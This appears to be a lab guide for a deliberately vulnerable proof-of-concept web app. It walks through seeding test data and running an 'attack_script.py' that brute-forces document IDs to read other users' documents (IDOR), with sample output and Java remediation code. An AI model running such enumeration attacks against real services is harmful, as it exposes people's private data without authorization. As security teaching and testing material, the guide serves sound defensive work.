# IDOR Vulnerability Testing - Attack Simulation Guide

## Overview

This guide demonstrates how to test the IDOR (Insecure Direct Object Reference) vulnerability in the application using automated Python scripts.

## Prerequisites

Install required Python packages:

```bash
pip install requests
```

Or:

```bash
pip3 install requests
```

## Step 1: Populate Database with Test Data

### Command 1A: Basic Population (5 users, 10 documents each)

```bash
python3 data_populator.py -u https://idor-poc-app.azurewebsites.net
```

### Command 1B: Custom Population (10 users, 20 documents each)

```bash
python3 data_populator.py -u https://idor-poc-app.azurewebsites.net --users 10 --docs 20
```

### Expected Output:
```
[HH:MM:SS] ============================================================
[HH:MM:SS] STARTING DATA POPULATION
[HH:MM:SS] ============================================================
[HH:MM:SS] Target: https://idor-poc-app.azurewebsites.net
[HH:MM:SS] Users to create: 5
[HH:MM:SS] Documents per user: 10

[HH:MM:SS] [+] User created: user1@example.com (ID: 2)
[HH:MM:SS] [+] Document created: 'Document 1 from User 1' by user1@example.com
...
[HH:MM:SS] DATA POPULATION COMPLETED
[HH:MM:SS] Total users created: 5
[HH:MM:SS] Total documents created: 50
```

---

## Step 2: Run Attack Script

### Command 2A: Register New Attacker Account and Attack

```bash
python3 attack_script.py \
  -u https://idor-poc-app.azurewebsites.net \
  --register-email attacker@example.com \
  --register-pass AttackerPass123! \
  --target-user 1 \
  --start-id 1 \
  --end-id 100
```

### Command 2B: Use Existing Account for Attack

```bash
python3 attack_script.py \
  -u https://idor-poc-app.azurewebsites.net \
  -e attacker@example.com \
  -p AttackerPass123! \
  --target-user 1 \
  --start-id 1 \
  --end-id 100
```

### Command 2C: Attack with Logging and Export

```bash
python3 attack_script.py \
  -u https://idor-poc-app.azurewebsites.net \
  --register-email attacker@example.com \
  --register-pass AttackerPass123! \
  --target-user 1 \
  --start-id 1 \
  --end-id 100 \
  --delay 0.05 \
  --output-log attack_log.txt \
  --export-json discovered_documents.json
```

### Command 2D: Aggressive Attack (Fast, More Documents)

```bash
python3 attack_script.py \
  -u https://idor-poc-app.azurewebsites.net \
  -e attacker@example.com \
  -p AttackerPass123! \
  --target-user 1 \
  --start-id 1 \
  --end-id 500 \
  --delay 0.01 \
  --output-log aggressive_attack.txt
```

### Expected Output:
```
[HH:MM:SS] ============================================================
[HH:MM:SS] IDOR VULNERABILITY ATTACK TOOL
[HH:MM:SS] ============================================================

[HH:MM:SS] [*] Registering attacker account: attacker@example.com
[HH:MM:SS] [+] Successfully registered! User ID: X
[HH:MM:SS] [*] Logging in as: attacker@example.com
[HH:MM:SS] [+] Login successful! Token obtained

[HH:MM:SS] [*] Starting brute-force attack on document IDs 1-100
[HH:MM:SS] [*] Target User ID: 1
[HH:MM:SS] [*] Delay between requests: 0.05s

[HH:MM:SS] [+] VULNERABLE! Document ID 1 accessible!
[HH:MM:SS]     Title: Document 1 from User 1
[HH:MM:SS]     Owner ID: 2
[HH:MM:SS]     Content: This is test document...
...
[HH:MM:SS] [+] Found 50 accessible documents

[HH:MM:SS] ============================================================
[HH:MM:SS] IDOR VULNERABILITY ATTACK REPORT
[HH:MM:SS] ============================================================
```

---

## Complete Attack Sequence (All Commands)

```bash
# Step 1: Populate database with 10 users and 15 documents each (150 total docs)
python3 data_populator.py -u https://idor-poc-app.azurewebsites.net --users 10 --docs 15

# Step 2: Run attack to discover all accessible documents
python3 attack_script.py \
  -u https://idor-poc-app.azurewebsites.net \
  --register-email attacker@example.com \
  --register-pass AttackerPass123! \
  --target-user 1 \
  --start-id 1 \
  --end-id 200 \
  --delay 0.05 \
  --output-log full_attack_log.txt \
  --export-json all_documents.json
```

---

## Attack Parameters Explanation

### Data Populator Parameters:
- `-u, --url`: Base URL of the application (required)
- `--users`: Number of users to create (default: 5)
- `--docs`: Number of documents per user (default: 10)

### Attack Script Parameters:
- `-u, --url`: Base URL of the application (required)
- `-e, --email`: Email for existing account (optional)
- `-p, --password`: Password for existing account (optional)
- `--register-email`: Email for new account registration (optional)
- `--register-pass`: Password for new account registration (optional)
- `--target-user`: Target User ID to extract documents from (default: 1)
- `--start-id`: Start document ID for brute-force (default: 1)
- `--end-id`: End document ID for brute-force (default: 100)
- `--delay`: Delay between requests in seconds (default: 0.1)
- `--output-log`: Save detailed log to file (optional)
- `--export-json`: Export discovered documents to JSON file (optional)

---

## Attack Scenarios

### Scenario 1: Discover All Documents
```bash
python3 data_populator.py -u https://idor-poc-app.azurewebsites.net --users 5 --docs 20

python3 attack_script.py \
  -u https://idor-poc-app.azurewebsites.net \
  --register-email attacker@example.com \
  --register-pass Attacker123! \
  --start-id 1 \
  --end-id 200
```

### Scenario 2: Target Specific User's Documents
```bash
python3 attack_script.py \
  -u https://idor-poc-app.azurewebsites.net \
  -e attacker@example.com \
  -p Attacker123! \
  --target-user 3 \
  --start-id 1 \
  --end-id 100
```

### Scenario 3: Large-Scale Attack with Logging
```bash
python3 attack_script.py \
  -u https://idor-poc-app.azurewebsites.net \
  --register-email attacker@example.com \
  --register-pass Attacker123! \
  --start-id 1 \
  --end-id 1000 \
  --delay 0.02 \
  --output-log large_scale_attack.txt \
  --export-json massive_data_leak.json
```

---

## Expected Vulnerability Demonstration

When you run the attack script, you should see:

1. **Successful Access to Other Users' Documents**: Despite being logged in as a different user, the attacker can access documents belonging to any user by guessing their document IDs.

2. **Data Leakage**: Sensitive information like:
   - API Keys
   - Database Credentials
   - Private Notes
   - Financial Information
   - Contact Details

3. **No Authorization Checks**: The application doesn't verify if the requesting user owns the document before returning it.

---

## Output Files

After running the attack with export options, you'll get:

### attack_log.txt
Detailed timeline of the attack with all discovered documents.

### discovered_documents.json
JSON format of all accessible documents:
```json
[
  {
    "doc_id": 1,
    "title": "Document 1 from User 1",
    "owner_id": 2,
    "content": "...",
    "created_at": "..."
  },
  ...
]
```

---

## Remediation

To fix this IDOR vulnerability, the backend should:

1. **Add Authorization Check** in DocumentController.getDocument():
```java
@GetMapping("/{id}")
public ResponseEntity<Document> getDocument(@PathVariable Long id, 
                                          @RequestHeader("Authorization") String authHeader) {
    String token = authHeader.substring(7);
    Long userId = jwtTokenProvider.getUserIdFromToken(token);
    
    Optional<Document> document = documentService.getDocumentById(id);
    
    if (document.isPresent() && document.get().getOwnerId().equals(userId)) {
        return ResponseEntity.ok(document.get());
    }
    return ResponseEntity.status(HttpStatus.FORBIDDEN).build();
}
```

2. **Verify Ownership** before returning any document.

3. **Use UUIDs** instead of sequential IDs for documents.

4. **Log Access** attempts for security monitoring.

---

## Commands at a Glance

```bash
# Populate data
python3 data_populator.py -u https://idor-poc-app.azurewebsites.net --users 10 --docs 15

# Simple attack
python3 attack_script.py -u https://idor-poc-app.azurewebsites.net --register-email attacker@example.com --register-pass Pass123!

# Attack with logging
python3 attack_script.py -u https://idor-poc-app.azurewebsites.net -e attacker@example.com -p Pass123! --output-log log.txt --export-json docs.json

# Aggressive attack
python3 attack_script.py -u https://idor-poc-app.azurewebsites.net -e attacker@example.com -p Pass123! --start-id 1 --end-id 500 --delay 0.01
```

---

## Troubleshooting

### Connection Errors
```bash
# Check if URL is accessible
curl https://idor-poc-app.azurewebsites.net/api/auth/login
```

### Module Not Found
```bash
# Install requests module
pip3 install requests --upgrade
```

### Timeout Issues
- Increase `--delay` parameter
- Check internet connection
- Verify application is running

---

## Testing Checklist

- [ ] Database populated with test data
- [ ] Data populator script created and working
- [ ] Attack script created and working  
- [ ] Attacker can access documents from other users
- [ ] Sensitive data is being leaked
- [ ] Logs are being generated
- [ ] JSON export is working
- [ ] Attack is documented and reported
